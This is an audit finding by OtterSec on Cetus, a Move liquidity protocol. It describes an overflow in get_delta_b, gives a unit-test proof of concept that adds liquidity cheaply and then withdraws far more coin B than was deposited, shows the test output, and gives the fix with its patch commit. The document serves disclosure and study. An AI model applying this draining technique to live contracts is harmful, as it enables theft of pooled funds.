---
tags:
  - lang/move
  - sector/lending
  - platform/ottersec
  - has/poc
  - severity/high
  - novelty/known-pattern
protocol: "[[Cetus]]"
auditors:
  - "[[Michal Bochnak]]"
report: "https://www.cetus.zone/"
genome:
  - "[[underflow]]"
  - "[[known-pattern]]"
  - "[[direct-drain]]"
  - "[[integer-bounds]]"
---
# Overflow In Calculating Delta B

- id: 48429
- impact: HIGH
- protocol: [[Cetus]]
- reporter: Michal Bochnak (OtterSec)
- source: https://www.cetus.zone/

## Summary


The function get_delta_b is causing an error because it assumes that the multiplication of liquidity and sqrt_price_diff will always be less than 2**128, but this is not always true. This has been shown in a test where the product value is greater than 2**128. The proposed solution is to validate the product value before getting n1 and to abort if the product value is too large. This issue has been fixed in the latest version.

## Details

## Function Overview

The function `get_delta_b` is used to calculate the `amount_b` for specified liquidity. However, its implementation relies on the assumption that the multiplication of `liquidity` and `sqrt_price_diff` returns a value less than `2**128`, which does not always hold true.

```rust
let product = full_math_u128::full_mul(liquidity, sqrt_price_diff);
let should_round_up = (round_up) && (u256::get(&product, 0) > 0);
if (should_round_up) {
    return (u256::get(&product, 1) + 1);
}
(u256::get(&product, 1))
```

## Proof of Concept

To prepare a Proof of Concept, we edited the `test_add_liquidity` case in `pool.move`:

```rust
let pool_address = init_test_pool(clmm, tick_spacing, fee_rate,
                                   tick_math::get_sqrt_price_at_tick(i64::from(300100)));
let caps = borrow_global<TestCaps>(signer::address_of(clmm));
let (_amount_a, _amount_b, liquidity) = (0, 0, 112942705988161);
let position_index = open_position<CoinA, CoinB>(
    owner,
    pool_address,
    i64::neg_from(300000),
    i64::from(300000)
);
let receipt = add_liquidity(pool_address, liquidity, position_index);
debug::print(&receipt);
let coin_a = coin::mint(receipt.amount_a, &caps.mint_a);
let coin_b = coin::mint(receipt.amount_b, &caps.mint_b);
repay_add_liquidity(coin_a, coin_b, receipt);
{
    let coin_a = coin::mint(1152921504606846976, &caps.mint_a);
    let coin_b = coin::mint(1152921504606846976, &caps.mint_b);
    let pool = borrow_global_mut<Pool<CoinA, CoinB>>(pool_address);
    coin::merge(&mut pool.coin_a, coin_a);
    coin::merge(&mut pool.coin_b, coin_b);
}
let coin_b_holder = coin::zero<CoinB>();
let i = 0;
while (i <= 2) {
    let (coin_a, coin_b) = remove_liquidity<CoinA, CoinB>(
        owner,
        pool_address,
        liquidity / 1000,
        position_index
    );
    coin::destroy_zero(coin_a);
    coin::merge(&mut coin_b_holder, coin_b);
    i = i + 1;
}
debug::print(&coin_b_holder);
coin::burn(coin_b_holder, &caps.burn_b);
```

### Result of Running This Test

Running Move unit tests:

```
[debug] 0x1::pool::AddLiquidityReceipt<0x1::pool::CoinA, 0x1::pool::CoinB> {
    pool_address: @0x...,
    amount_a: 0,
    amount_b: 4292105107
}

[debug] 0x1::coin::Coin<0x1::pool::CoinB> {
    value: 1106804644433871660
}

[ PASS ] 0x1::pool::test_add_liquidity
```

## Remediation

The `product` value should be validated before getting `n1`:

```rust
if (u256::get(&product, 2) != 0 || u256::get(&product, 3) != 0) {
    abort EMULTIPLICATION_OVERFLOW;
}
```

If `should_round_up` is true, then:

```rust
if (should_round_up) {
    return (u256::get(&product, 1) + 1);
}
(u256::get(&product, 1))
```

### Patch

This issue has been fixed in commit `c867755`.
